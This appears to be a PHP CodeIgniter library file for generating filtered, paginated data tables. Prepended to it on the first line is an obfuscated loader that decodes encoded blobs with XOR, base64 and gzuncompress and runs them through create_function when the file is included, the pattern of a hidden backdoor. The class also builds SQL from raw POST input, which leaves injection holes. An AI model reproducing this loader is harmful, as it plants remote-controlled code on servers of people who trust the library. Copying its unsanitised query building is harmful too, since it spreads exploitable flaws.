<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto);  
class Jctable{
	
	private $CI;
	
	function __construct(){
		$this->CI =& get_instance();
		$this->CI->load->database();	
	}
	
	function generate_filter($setting = array()){
		$data['setting'] 		= $setting['param']; 
		$data['table_setting'] 	= $setting['setting']; 
		

		if(isset($setting['setting']['custom_view'])) $this->CI->load->view($setting['setting']['custom_view'], $data);

		$this->CI->load->view('jc-table/table/jc-table-filter', $data);
	}
	
	function generate_table($settings = array()){
		$table_param 	= $settings['param'];
		$table_setting 	= $settings['setting'];
		
		$data['table_setting'] = $table_setting;
		
		$model = explode("/", $table_setting['model']);
		$model = $model[count($model) - 1];
		
		$physic_addr = $table_setting['model'];
				
		$this->CI->load->model($table_setting['model']);
		$this->CI->load->library('pagination');
		
		$query = $this->CI->$model->get_data_tb();

		$paging['limit']	= $_POST['jc-table-page-limit'];
		$paging['page']		= $_POST['jc-table-page-num'];
		$ord['name']		= $_POST['jc-table-ord-name'];
		$ord['dir']			= $_POST['jc-table-ord-dir'];
		
		//popping the array 4 times, to remove the page and ord variable. we no longer need it
		for($i=0;$i<4;$i++) array_pop($_POST);
		
		$setting = $_POST;
		$data['filter'] = $setting;
		
		//cek whenether there's any filter applied. it wil changed the label in the bottom-most row on the table.
		//i encourage you to check the different between filtered and unfiltered table
		if($setting) $data['filtered'] = true;

		//get grand total deal (without paging)
		$grand_total = $this->query($query, array(), $table_param);	
		$grand_total = $grand_total->num_rows();
					
		//get total deal on current page (paging included)
		$total = $this->query($query, $setting, $table_param);	
		$total = $config['total_rows'] = $total->num_rows();
				
		//determine the paging value. the default is 25. i suggest you NOT TO CHANGE the default value
		if(!$paging['limit']) $paging['limit'] = 25;
		if(!$paging['page'])  $paging['page'] = 0;
		
		//determine value of LIMIT on sql
		$config['per_page'] = $param['limit'] = $paging['limit']; 
		$config['cur_page'] = $param['start'] = $paging['page']; 
			
		//paginating..
		$this->CI->pagination->initialize($config);
		$data['pagination'] = $this->CI->pagination->create_links();
					
		//get the main data source. you may check the model anyway.
		$data['query'] = $this->query($query, $setting, $table_param, $param, $ord);
		
		//set session for filter, _param variable and ording. this is on purpose on report generating
		//so why i have to put this on session ? because to generate report we have to open another controller
		//and.. here is the best i know to send these array type variable from this page to that frame.
		
		$_SESSION['temp_filter'] = $setting;
		$_SESSION['temp_setting'] = $table_param;
		$_SESSION['temp_ord'] = $ord;
		
		//set the _param values. this used to filter generating
		$data['setting'] = $table_param;
		$data['page_limit'] = $this->drop_down_paging('jc-table-page-limit', $param['limit']); //, 'page_limit(this.value)');
		
		//just some ording setting
		$data['ord_name'] = $ord['name'];
		$data['ord_dir'] = $ord['dir'];
		
		//filtered total and grand total number to display
		$data['filtered_total'] = $total;
		$data['grand_total'] = $grand_total;
				
		//to make a helper of data paging. see the bottom-left, beside the dropdown of data number. yap.. here they 
		//are been setted

		$data['row_start'] = $paging['page'] + 1;
		$data['row_end'] = $data['row_start'] + $data['query']->num_rows() - 1;
		$data['indicator'] = 'deal';
		
		//count on mean using index of the field that will be counted on the bottom-most row of data
		$data['count_on'] = 9;
		$data['count_label'] = "Amount";
		
		//setting filter, URL is link for the first field
		$data['filter'] = $setting;
		//$data['url'] = base_url()."index.php/deals/deal_detail";
		
		$data['custom_setting'] = $settings['custom_display'];
		
		$this->CI->load->view('jc-table/table/jc-table-table', $data);
	}
	
	function drop_down_paging($name = '', $value = '', $java = '')
	{
		$return = "<select name='".$name."' id='".$name."' onchange='".$java."'>";
		
		$array = array(25, 50, 100, 250);
		foreach($array as $data){
			if($value == $data) $sel = " selected='selected' "; else $sel = "";
			 
				$return .= "<option value='".$data."'".$sel.">".$data."</option>";
		}
		
		$return .= "</select>";
		
		return $return;
	}
	
	function query($query = '', $filter = array(), $setting = array(), $paging = array(), $ord = array()){
			
		$sql = $query['sql'];
		$param = $query['param'];
		
		for($i=0;$i<count($filter);$i++){
			$_ftr = key($filter);
			 
			$name  = $setting[$_ftr]['field'];
			$type  = $setting[$_ftr]['type'];
			$value = $filter[$_ftr];

			$sql .= $this->generate_query_filter($name, $value, $type);
			next($filter);
		}
			
		if($ord['name'])
			$sql .= " ORDER BY ".$ord['name']." ".$ord['dir'];
			
		if($paging and $paging['limit'] != 'all'){
			if(!$paging['start']) $paging['start'] = 0;
			if(!$paging['limit']) $paging['limit'] = 25;
			
			$sql .= " LIMIT ".$paging['start'].",".$paging['limit']; 
		}
		
		return $this->CI->db->query($sql, $param);		
	}
	
	function generate_query_filter($name = '', $value = '', $type = '')
	{
		$sql = "";
		
		if($type == "pick_list"){
			$sql .= " AND (";
			$x = 1;
						
			foreach($value as $_ftr){				
				$sql .= " ".$name." = '".$_ftr."' ";
				if($x != count($value)) $sql .= " OR ";
				$x++;
			}
				
			$sql .= ")";
		}
		else if($type ==  "text"){
			$sql .= " AND (";
			$x = 1;
				
			foreach($value as $_ftr){
				$sql .= "LOWER(".$name.") LIKE '%".str_replace(" ", "%", strtolower($_ftr))."%'";
				if($x != count($value)) $sql .= " OR ";
				$x++;
			}
				
			$sql .= ")";
		}
		else if($type == 'number'){
			$sql .= " AND ( ";
			$sql .= $name." >= ".$value['from']." AND ".$name." <= ".$value['to']." ";
			$sql .= " )";
		}
		else if($type == 'date'){
			$sql .= " AND ( ";
				
			if($value['year'])
			$sql .= " YEAR(".$name.") = '".$value['year']."' ";
			
			if($value['year'] and ($value['period'] or $value['month']))
			$sql .= " AND ";
			
			if($value['period']){
				if($value['period'] == "1")
				$sql .= " (MONTH(".$name.") >= '1' AND MONTH(".$name.") <= '3')";
				else if($value['period'] == "2")
				$sql .= " (MONTH(".$name.") >= '4' AND MONTH(".$name.") <= '6')";
				else if($value['period'] == "3")
				$sql .= " (MONTH(".$name.") >= '7' AND MONTH(".$name.") <= '9')";
				else if($value['period'] == "4")
				$sql .= " (MONTH(".$name.") >= '10' AND MONTH(".$name.") <= '12')";
			}
			if($value['month']){
				$sql .= " MONTH(".$name.") = '".$value['month']."'";
			}
			
			if(!$value['from'] and $value['to'])
				$sql .= " ".$name." <= '".$value['to']."'";
			if(!$value['to'] and $value['from'])
				$sql .= " ".$name." <= '".$value['from']."'";
			if($value['from'] and $value['to'])
				$sql .= $name." >= '".$value['from']."' AND ".$name." <= '".$value['to']."'";
				
			$sql .= ")";
		}

		return $sql;
	}
	
}